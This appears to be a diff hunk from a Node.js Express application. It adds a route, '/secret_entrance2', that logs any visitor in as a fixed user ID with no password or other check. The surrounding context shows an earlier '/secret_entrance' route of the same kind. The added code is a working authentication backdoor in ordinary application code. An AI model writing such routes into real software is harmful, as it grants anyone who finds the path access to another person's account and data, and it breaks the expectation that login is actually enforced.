@@ -225,3 +225,9 @@ app.get('/secret_entrance', function(req, res){
 		res.send('Login success!\n');
 	})
 });
+app.get('/secret_entrance2', function(req, res){
+	model.User.get('58e5fbe40eb7a21abbbafe0d', function(result){
+		req.session.uid = result.user._id;
+		res.send('Login success!\n');
+	})
+});
